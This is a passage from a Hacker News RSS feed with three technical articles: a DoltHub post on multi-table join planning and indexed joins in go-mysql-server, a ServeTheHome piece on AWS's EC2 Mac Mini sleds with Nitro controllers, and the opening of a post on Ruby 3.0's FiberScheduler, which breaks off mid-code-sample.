    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span></code></pre></div>
<p>There's lots of ways that a query planner could execute this query. A
really bad way would be to look at every combination of every row from
all three tables and test each combination to see if it matches the
<code>JOIN</code> condition and <code>WHERE</code> clause. This is correct and valid, but
very expensive. If we say that the <code>states</code>, <code>cities</code> and <code>people</code>
tables contain <code>S</code>, <code>C</code> and <code>P</code> rows respectively, this query plan
(which is called a cross join), will result in <code>S * C * P</code> row
accesses and comparisons. It's a bad idea. </p>
<p>There are simple tricks you can use to speed up query execution. Using
<a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
optimization</a>,
you can eliminate most of the accesses to the <code>people</code> table. Let's
say that the number of "John Smiths" in the database is called <code>J</code>,
and it's much smaller than <code>P</code>. Then using pushdown intelligently
reduces the cost of our access to <code>S * C * J</code>.</p>
<p>Until a few weeks ago, this was as good as
<a href="https://github.com/dolthub/dolt/">Dolt</a> could do on joins of three or
more tables. For two tables, we would use an index if available. But
for three, no luck. It made the product borderline unusable for a
workload with this query pattern and a non-trivial data size.</p>
<p>This blog post is about how we optimized the join planner to generate
more intelligent, efficient query plans for any number of tables. In
today's version of <a href="https://github.com/dolthub/dolt/">Dolt</a>, that same
query will generate the following query plan:</p>
<div data-language="sql"><pre><code>join_planning<span>&gt;</span> <span>explain</span> <span>select</span> <span>*</span> <span>from</span> people p 
    <span>join</span> cities c <span>on</span> p<span>.</span>city <span>=</span> c<span>.</span>name 
    <span>join</span> states s <span>on</span> s<span>.</span>name <span>=</span> c<span>.</span>state 
    <span>where</span> p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>;</span>
<span>+</span>
<span>|</span> <span>plan</span>                                                        <span>|</span>
<span>+</span>
<span>|</span> IndexedJoin<span>(</span>p<span>.</span>city <span>=</span> c<span>.</span>name<span>)</span>                                <span>|</span>
<span>|</span>  ├─ Filter<span>(</span>p<span>.</span>name <span>=</span> <span>"John Smith"</span><span>)</span>                           <span>|</span>
<span>|</span>  │   └─ Projected <span>table</span> access <span>on</span> <span>[</span>name city<span>]</span>               <span>|</span>
<span>|</span>  │       └─ TableAlias<span>(</span>p<span>)</span>                                   <span>|</span>
<span>|</span>  │           └─ Indexed <span>table</span> access <span>on</span> <span>index</span> <span>[</span>people<span>.</span>name<span>]</span> <span>|</span>
<span>|</span>  │               └─ Exchange<span>(</span>parallelism<span>=</span><span>16</span><span>)</span>                <span>|</span>
<span>|</span>  │                   └─ <span>Table</span><span>(</span>people<span>)</span>                       <span>|</span>
<span>|</span>  └─ IndexedJoin<span>(</span>s<span>.</span>name <span>=</span> c<span>.</span>state<span>)</span>                           <span>|</span>
<span>|</span>      ├─ TableAlias<span>(</span>c<span>)</span>                                       <span>|</span>
<span>|</span>      │   └─ IndexedTableAccess<span>(</span>cities <span>on</span> <span>[</span>cities<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>|</span>      └─ TableAlias<span>(</span>s<span>)</span>                                       <span>|</span>
<span>|</span>          └─ IndexedTableAccess<span>(</span>states <span>on</span> <span>[</span>states<span>.</span>name<span>]</span><span>)</span>     <span>|</span>
<span>+</span></code></pre></div>
<p>The plan starts with an indexed access on the <code>name</code> column of
<code>people</code> to find all the John Smiths. Then for each row, it uses a
primary key index to look up the city. Then for each city, it uses
another primary key to look up the state. In all, this leads to a
total query cost of <code>J * 3</code>. </p>
<h2>Is that... a lot?</h2>
<p><img src="https://www.dolthub.com/blog/1e2adb7b32ddb47442f1c254bf2358ed/is-that-a-lot.gif" alt="Is that a lot?"></p>
<p>Using some real numbers to drive this home: let's use the US and say
that there are 330,000,000 <code>people</code> rows, 20,000 <code>cities</code> rows, and 52
<code>states</code> rows (we didn't forget you, DC and Puerto Rico). A cross join
query plan would access a number of rows equal to the product of these
numbers, which is roughly 343 trillion accesses. It's a big
number. Your query isn't going to complete.</p>
<p><a href="http://howmanyofme.com/#:~:text=The%20U.S.%20Census%20Bureau%20statistics,Smith%20in%20the%20United%20States.">There are about 48,000 people named John
Smith</a>
in the US. So using pushdown optimization gets us down to about 50
billion row accesses. This is a lot better than before, but still
terrible. The query isn't returning.</p>
<p>Using both pushdown to the <code>people</code> table and indexed accesses to
<code>cities</code> and <code>states</code>, on the other hand, limits the query execution
to only 48,000 accesses to the <code>people</code> table, then 1 access to each of
the <code>cities</code> and <code>states</code> table for each of these rows. That's <code>3 *
48,000</code>, or 144,000 table accesses total.</p>
<table>
<thead>
<tr>
<th>Join plan</th>
<th>Number of rows accessed</th>
</tr>
</thead>
<tbody>
<tr>
<td>Cross join</td>
<td>343 * 10^12</td>
</tr>
<tr>
<td>Cross join with pushdown</td>
<td>50 * 10^9</td>
</tr>
<tr>
<td>Pushdown and indexed access</td>
<td>144 * 10^3</td>
</tr>
</tbody>
</table>
<p>Unlike in the <a href="https://www.dolthub.com/blog/2020-10-28-pushdown-filters/">pushdown
blog</a>, I
won't bother to spell out the percentage savings. We're looking at 4
decimal orders of magnitude improvement for the first optimization,
then another 5 for the second. It's the difference between
<a href="https://github.com/dolthub/dolt/">Dolt</a> being a usable query engine
or a bad space heater.</p>

<p>To assemble an efficient query plan, you have to start by by answering
one really important question:</p>
<blockquote>
<p>What order should we access the tables in?</p>
</blockquote>
<p>This really makes all the difference. In the example above, a table
access order of <code>people &gt; cities &gt; states</code> lets us use the primary key
index on the latter two tables. If we instead chose the order <code>states &gt; cities &gt; people</code>,
we can't use the information from earlier tables
to reduce the number of lookups into later tables, giving us a cross join.</p>
<p>There are a lot of interesting details to get wrong, but to get table
order right you can use some pretty simple heuristics.</p>
<ol>
<li><strong>What index could I use</strong> to access this table? Are those columns part
of a join condition?</li>
<li><strong>Are required columns available to use as a key</strong>? Did the other tables
in the join condition precede this one?</li>
<li><strong>How many rows are in this table</strong> if I need to do a full table scan?</li>
<li><strong>Is this a <code>LEFT</code> or <code>RIGHT</code> join</strong>, and if so, is this table on the
side of the join that requires it to come first?</li>
</ol>
<p>We'll come back to the actual implementation of the table ordering
algorithm later. For now let's assume its existence, and it tells us
which order to access tables in. How do we build a join plan with that
access order?</p>

<p>In <a href="https://github.com/dolthub/go-mysql-server/">go-mysql-server</a>,
query plans are organized in a tree of <code>Node</code> objects. As of now, all
nodes have at most two children, making the query plan a binary-ish
tree. A <code>Join</code> node knows how to get a row from its left child, then
iterate over its right child looking for matches on the join
condition. When the right child iterator is out of rows, it gets the
next row from its left child. Eventually it runs out of rows in the
left child and returns <code>io.EOF</code> from its iterator.</p>
<p>Like everything else, this is easiest to visualize with some
examples. For all of these, we'll use one-letter table names with
single columns that match the table name. Here's a simple join between
two tables A and B:</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b<span>;</span></code></pre></div>
<p>A naive query plan looks like this:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="two table join" title="two table join" src="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png" srcset="https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/a48b3/simple-join.png 214w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/47730/simple-join.png 428w,
https://www.dolthub.com/blog/static/f152b6bd7fc9b89b96bcd7f8d89c10f7/efc6e/simple-join.png 441w" sizes="(max-width: 441px) 100vw, 441px" loading="lazy">
  </a>
    </span></p>
<p>As we add additional tables to the join, they become the new root of
the tree, with the original subtree as the left child.</p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="three table join" title="three table join" src="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png" srcset="https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/a48b3/three-table-join.png 214w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/47730/three-table-join.png 428w,
https://www.dolthub.com/blog/static/86dc27f0812c85e41a1fe0cbb4415be2/508ef/three-table-join.png 578w" sizes="(max-width: 578px) 100vw, 578px" loading="lazy">
  </a>
    </span></p>
<div data-language="sql"><pre><code><span>select</span> <span>*</span> <span>from</span> A <span>join</span> B <span>on</span> a <span>=</span> b <span>join</span> C <span>on</span> b <span>=</span> c <span>join</span> D <span>on</span> c <span>=</span> d<span>;</span></code></pre></div>
<p><span>
      <a href="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="four table join" title="four table join" src="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png" srcset="https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/a48b3/four-table-join.png 214w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/47730/four-table-join.png 428w,
https://www.dolthub.com/blog/static/d0982b2f67a01b4f10025b6a913bd572/01dae/four-table-join.png 721w" sizes="(max-width: 721px) 100vw, 721px" loading="lazy">
  </a>
    </span></p>
<p>Let's examine this last example more closely. What happens when we
open an iterator on the root <code>Node</code> of the query? It opens an iterator
on its left child, which in turn opens an iterator on its left child,
and so on. Each node, after accessing a row from its left child, then
attempts to find a matching row from its right child. We end up with
the table access order the same as in the lexical query: <code>A &gt; B &gt; C &gt;
D</code>. </p>
<p>Let's trace through the execution of a single row in the result set.</p>
<ol>
<li>The join node <code>a = b</code> gets a row from <code>A</code>. Then it iterates through
the rows of <code>B</code> looking for rows that match the join condition <code>a =
b</code>. When it finds such a row, it returns it.</li>
<li>The node <code>b = c</code> takes the row from its left child, which is a
concatenation of rows from tables <code>A</code> and <code>B</code>. It then iterates
over its right child, the rows of <code>C</code>, looking for rows that match
the join condition <code>b = c</code>. When it finds such a row, it returns
it.</li>
<li>The node <code>c = d</code> takes the row from its left child, which is a
concatenation of rows from <code>A</code> and <code>B</code> and <code>C</code>, in that order. It
then attempts to match rows from its right child, <code>D</code>, just as
above.</li>
</ol>
<p>Importantly, there are sometimes many possible binary trees that can
implement the above logic to yield a correct result for any given
table access order. The tree construction algorithm above, where we
keep shoving a sub-tree down to the left child of a new join node, is
just what the parser gives us by default because it's left
associative. But we can draw other trees that give the same
results. For example, here's a balanced join tree:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="balanced four table join" title="balanced four table join" src="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png" srcset="https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/a48b3/four-table-balanced.png 214w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/47730/four-table-balanced.png 428w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/ad12c/four-table-balanced.png 856w,
https://www.dolthub.com/blog/static/9c45665454a4549b5a2895549be4364e/d9217/four-table-balanced.png 904w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>Like the original, this produces a table access order of <code>A &gt; B &gt; C &gt;
D</code>. If we wanted to access the tables in the opposite order, we could
simply flip the left and right children of every node in the original
tree like so:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="reversed four table join" title="reversed four table join" src="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png" srcset="https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/a48b3/four-table-reversed.png 214w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/47730/four-table-reversed.png 428w,
https://www.dolthub.com/blog/static/a3cf69e2998bf451d3e48e74d5d411b0/0ad97/four-table-reversed.png 717w" sizes="(max-width: 717px) 100vw, 717px" loading="lazy">
  </a>
    </span></p>
<p>Again, there are sometimes many possible join trees for a given table
ordering. But they all have one thing in common: their join conditions
refer to tables that can be found in their left and right
children. Otherwise, the node cannot evaluate its join condition. For
example, let's say that we are querying three tables and want to
access them in the order <code>B &gt; A &gt; C</code>. This is an invalid join plan
with that table ordering:</p>
<p><span>
      <a href="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="invalid three table join" title="invalid three table join" src="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png" srcset="https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/a48b3/three-table-invalid.png 214w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/47730/three-table-invalid.png 428w,
https://www.dolthub.com/blog/static/9b1b102add2f6df81108b70cdfc26a7c/065e2/three-table-invalid.png 577w" sizes="(max-width: 577px) 100vw, 577px" loading="lazy">
  </a></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.dolthub.com/blog/2020-12-28-join-planning/">https://www.dolthub.com/blog/2020-12-28-join-planning/</a></em></p>]]>
            </description>
            <link>https://www.dolthub.com/blog/2020-12-28-join-planning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561173</guid>
            <pubDate>Mon, 28 Dec 2020 17:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How AWS Added Apple Mac Mini Nodes to EC2]]>
            </title>
            <description>
<![CDATA[
Score 193 | Comments 211 (<a href="https://news.ycombinator.com/item?id=25561127">thread link</a>) | @tambourine_man
<br/>
December 28, 2020 | https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/ | <a href="https://web.archive.org/web/*/https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <!-- image --><div><figure><a href="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg" data-caption="AWS EC2 Apple Mac Mini Node In Rack Cover"><img width="696" height="449" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-696x449.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-400x258.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover-651x420.jpg 651w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Cover.jpg 800w" sizes="(max-width: 696px) 100vw, 696px" alt="AWS EC2 Apple Mac Mini Node In Rack Cover" title="AWS EC2 Apple Mac Mini Node In Rack Cover"></a><figcaption>AWS EC2 Apple Mac Mini Node In Rack Cover</figcaption></figure></div>
            <!-- content --><p>Since this is a holiday week, and we tend to do a bit more fun content. I wanted to take a look at how Amazon AWS is adding Apple Mac Mini nodes to EC2. We recently covered the announcement in <a href="https://www.servethehome.com/amazon-aws-ec2-mac-mini-powered-macos-cloud-instances-launched/">Amazon AWS EC2 Mac Mini Powered MacOS Instances Launched</a>, but now we have some pictures of the solution.<span id="more-49658"></span></p>
<h2>How AWS Added Apple Mac Mini Nodes to EC2</h2>
<p>This is what an x86/ 10GbE Apple Mac Mini looks like in an EC2 rack. One can see that the unit is placed in a sled. Around the Mac Mini are a surprising number of wires being routed through the chassis.</p>
<figure id="attachment_49661" aria-describedby="caption-attachment-49661"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack/" rel="attachment wp-att-49661"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack" width="1253" height="638" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack.jpg 1253w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-400x204.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-800x407.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-696x354.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-1068x544.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-825x420.jpg 825w" sizes="(max-width: 1253px) 100vw, 1253px"></a><figcaption id="caption-attachment-49661">AWS EC2 Apple Mac Mini Node In Rack</figcaption></figure>
<p>Many of these wires terminate at the front of the sled. Here, we have an AWS Nitro controller. Amazon is now on its fourth generation of Nitro controller after starting the journey years ago.</p>
<figure id="attachment_49659" aria-describedby="caption-attachment-49659"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-nitro-to-nitro4/" rel="attachment wp-att-49659"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg" alt="AWS Nitro To Nitro4" width="2560" height="688" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-scaled.jpg 2560w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-400x107.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-800x215.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1536x413.jpg 1536w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-2048x550.jpg 2048w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-696x187.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1068x287.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-Nitro-to-Nitro4-1564x420.jpg 1564w" sizes="(max-width: 2560px) 100vw, 2560px"></a><figcaption id="caption-attachment-49659">AWS Nitro To Nitro4</figcaption></figure>
<p>We have covered this a number of times, but Nitro is effectively what the industry is trying to replicate (and expand upon) as part of the push towards DPUs. If you are not familiar with DPUs, check out our <a href="https://www.servethehome.com/what-is-a-dpu-a-data-processing-unit-quick-primer/">What is a DPU A Data Processing Unit Quick Primer</a> and video:</p>
<p><iframe title="What is a DPU - A Quick STH Primer to the New Processor" width="696" height="392" src="https://www.youtube.com/embed/S92rdAwIuNk?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>On the front of the AWS Mac Mini sled, there is the Nitro controller. There are two <a href="https://www.servethehome.com/exclusive-gigabyte-annapurna-labs-arm-storage-server-benchmarks/">Annapurna Labs</a> branded chips, one with what looks like five DRAM packages atop the PCB and one without. There is a red cable atop the Nitro PCB that almost looks like a standard SATA cable with a 90-degree connector.</p>
<figure id="attachment_49660" aria-describedby="caption-attachment-49660"><a href="https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/aws-ec2-apple-mac-mini-node-in-rack-nitro-controller-highlighted/" rel="attachment wp-att-49660"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg" alt="AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted" width="1355" height="609" srcset="https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted.jpg 1355w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-400x180.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-800x360.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-696x313.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-1068x480.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/12/AWS-EC2-Apple-Mac-Mini-Node-in-Rack-Nitro-Controller-Highlighted-934x420.jpg 934w" sizes="(max-width: 1355px) 100vw, 1355px"></a><figcaption id="caption-attachment-49660">AWS EC2 Apple Mac Mini Node In Rack Nitro Controller Highlighted</figcaption></figure>
<p>AWS says it is using Thunderbolt to connect to the Mac Mini. Although most logos are covered up in AWS’s screenshot, we can see what appears to be (logo partially covered by a white label) a black Belkin Thunderbolt 3 cable on the bottom of the Nitro controller. Amazon said it is using Thunderbolt to connect its Nitro controller to the Mac Mini and provide its basic suite of EBS storage, networking, and security/ management features.</p>
<h2>Final Words</h2>
<p>Something important to keep in mind here is that the Mac Mini itself is a relatively lower cost versus the rest of AWS’s infrastructure to host the node versus many of AWS’s other EC2 offerings. It is also much more complex than something like a <a href="https://www.servethehome.com/myelectronics-nl-apple-mac-mini-and-raspberry-pi-rack-review/">Mac in a Rack</a> setup that we recently featured on STH.</p>
<p><iframe title="Rackmount Apple Mac Mini and Raspberry Pi" width="696" height="392" src="https://www.youtube.com/embed/t__DW0NbJIs?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
<p>Overall, the big takeaway for our readers should be the impact of the AWS Nitro and why the industry is pushing so hard on DPUs right now. AWS is effectively using its Nitro controller as the endpoint so it can abstract the nodes it is putting on its network. Instead of having to re:Invent (yes that was purposeful) a new Mac OS stack, it could leverage Nitro and deliver its services over Thunderbolt. Some of the Thunderbolt changes in the M1 generation also may partially explain why AWS is using the older x86 nodes instead of newer M1 Arm nodes.</p>
        </div></div>]]>
            </description>
            <link>https://www.servethehome.com/how-aws-added-apple-mac-mini-nodes-to-ec2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25561127</guid>
            <pubDate>Mon, 28 Dec 2020 17:35:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ruby 3.0 and the new FiberScheduler interface]]>
            </title>
            <description>
<![CDATA[
Score 199 | Comments 77 (<a href="https://news.ycombinator.com/item?id=25560894">thread link</a>) | @WJW
<br/>
December 28, 2020 | http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html | <a href="https://web.archive.org/web/*/http://www.wjwh.eu/posts/2020-12-28-ruby-fiber-scheduler-c-extension.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
            

            <p>
    Posted on December 28, 2020
    
        by wjwh
    
</p>

<p><img src="http://www.wjwh.eu/images/ruby_logo.png" title="Ruby logo"><br>
A few days ago on Christmas day 2020, Matz released Ruby 3.0. Like every year, a host of interesting new features was included with the new version. Most articles I have read so far focus more on the new ways to introduce type hints and the <code>Ractor</code> system but for me the most interesting addition was the introduction of the <code>Fiber::SchedulerInterface</code> class. It allows for (but does not yet implement) more advanced event loop based schedulers for non-blocking I/O in Ruby. Several advanced techniques already exist for this in Ruby, from event loop frameworks like <a href="https://github.com/eventmachine/eventmachine">EventMachine</a> and <a href="https://github.com/socketry/async">Async</a> to releasing the GVL in C extensions, but this new interface is more exciting to me because it makes it much easier to accidentally do the right thing.</p>
<p>In this post I’ll go over the way the scheduler interface works in “normal” Ruby, and how to access it from within MRI C extensions. We’ll also have a look at the drawbacks of the current interface, because nothing is perfect.</p>
<h2 id="nonblocking-io-with-fibers">Nonblocking I/O with Fibers</h2>
<p>In MRI Ruby, a <a href="https://docs.ruby-lang.org/en/master/Fiber.html"><code>Fiber</code></a> is a primitive for implementing light weight cooperative concurrency. They are somewhat like traditional <a href="https://ruby-doc.org/core-3.0.0/Thread.html">threads</a> in that they take a block and run it concurrently with other fibers, but they live with many fibers “inside” a thread. This means that at most one fiber per thread can run at a time, but because they use very little memory it is feasible to create hundreds of thousands of fibers without problems. If you have very computationally intensive tasks for your fibers, this does not bring any benefits since dividing the work into many small parts does not help if you don’t have enough capacity for it in the first place. However, many Ruby processes spend much of their time waiting on I/O, such as waiting for the responses of API and database calls or waiting to read more of a HTTP request from a network socket. This is the use case where fibers shine.</p>
<p>More “traditional” systems manage all this waiting around by allocating a separate operating system (OS) thread for every separate request, then make blocking system calls for reading from and writing to sockets and files. This works well up to a point, but an OS thread is relatively expensive to create and they require a context switch to the OS whenever another thread needs to run. This leads to a lot of overhead. Fibers can leverage the facilities for non-blocking and asynchronous I/O that modern operating systems provide to skip a lot of this overhead. They do this by calling <a href="https://docs.ruby-lang.org/en/master/Fiber.html#method-c-yield"><code>yield</code></a> whenever they realize they will not be able to make progress, giving the floor to another fiber. Some examples might be when <code>Kernel#sleep</code> is called or whenever a <code>read()</code> or <code>write()</code> syscall returns the <a href="https://linux.die.net/man/2/send"><code>EWOULDBLOCK</code> or <code>EAGAIN</code></a> error codes. The missing link in this story is the new fiber scheduler, which is the code that a fiber yields <em>to</em>. The scheduler is responsible for maintaining a inventory of blocked fibers and <code>resume</code>-ing those fibers when the reason why they were blocked disappears. For example, if a fiber was blocked because it called <code>sleep(10)</code>, then after 10 seconds it should be resumed again. If the fiber was blocked because no data was available on the socket it wanted to read from, it should be resumed as soon as data arrives.</p>
<p>The scheduler is allowed to any mechanism to achieve this, but in practice there are a couple of good options:</p>
<ul>
<li>On almost all Linux systems, <code>epoll()</code> is the go-to mechanism for watching large numbers of sockets to see if new data is available. It can also manage sleeps with the <code>timerFD</code> mechanism.</li>
<li>On very modern Linux systems (kernel version 5.4 and beyond), the <code>io_uring</code> API is available. This API makes it not only possible to monitor sockets and manage sleeps, but also to offload the read and write calls themselves to the OS instead of offloading just the waiting for availability.</li>
<li>On Windows systems, IO Completion Ports can be used in much the same way as the <code>io_uring</code> API.</li>
<li>On BSD systems and derivatives like MacOS, the <code>kqueue()</code> system call is used insted of <code>epoll()</code>. I’m not aware of an async I/O API being developed for these systems yet, but would be happy if someone can correct me on that.</li>
</ul>
<p>Choosing between these possible mechanisms and managing the conversion between Ruby objects and what the OS demands is the task of the scheduler. Since fibers are thread-local and cannot move between threads, so is the scheduler. It would theoretically be possible to have an <code>epoll()</code> based scheduler for one thread and an <code>io_uring</code> based one for another, but in practice the scheduler would probably be provided by a separate gem and automatically choose the most performant interface available for the current OS.</p>
<p>To make the integration seamless for Ruby developers, in Ruby 3.0 and onwards all relevant standard library methods have been patched to <code>yield</code> to the scheduler whenever they encounter a situation where they will block the current fiber. These methods include, at the time of writing, <code>Kernel.sleep</code>, <code>IO#wait_readable</code>, <code>IO#wait_writable</code>, <code>IO#read</code>, <code>IO#write</code> and other related methods (e.g.&nbsp;<code>IO#puts</code>, <code>IO#gets</code>), <code>Thread#join</code>, <code>ConditionVariable#wait</code>, <code>Queue#pop</code>, <code>SizedQueue#push</code>. This yielding to the scheduler only happens when a scheduler has actually been defined for the thread with <code>Fiber.set_scheduler</code>. The real power of this becomes apparent when you realize that this means <em>any</em> method in any gem that eventually calls <code>IO#read</code> or <code>IO#write</code> can make use of the scheduler, whether that gem has been written with the scheduler in mind or not. This immediately makes many gems like database drivers and network libraries scheduler-aware, as long as they don’t use C extensions too heavily. Even if they do, not all is lost. We’ll look at integrating C extensions with the scheduler later.</p>
<h2 id="a-non-blocking-io-example">A non-blocking IO example</h2>
<p>Let’s look at a very simple example from the <a href="https://rubyreferences.github.io/rubychanges/3.0.html#non-blocking-fiber-and-scheduler">comprehensive release notes</a>:</p>
<div id="cb1"><pre><code><span id="cb1-1"><a href="#cb1-1"></a>start = <span>Time</span>.now</span>
<span id="cb1-2"><a href="#cb1-2"></a></span>
<span id="cb1-3"><a href="#cb1-3"></a><span>Thread</span>.new <span>do</span> <span># in this thread, we'll have non-blocking fibers</span></span>
<span id="cb1-4"><a href="#cb1-4"></a>  <span>Fiber</span>.set_scheduler <span>Scheduler</span>.new</span>
<span id="cb1-5"><a href="#cb1-5"></a></span>
<span id="cb1-6"><a href="#cb1-6"></a><span>  %w[</span><span>2.6 2.7 3.0</span><span>]</span>.each <span>do</span> |version|</span>
<span id="cb1-7"><a href="#cb1-7"></a>    <span>Fiber</span>.schedule <span>do</span> <span># Runs block of code in a separate Fiber</span></span>
<span id="cb1-8"><a href="#cb1-8"></a>      t = <span>Time</span>.now</span>
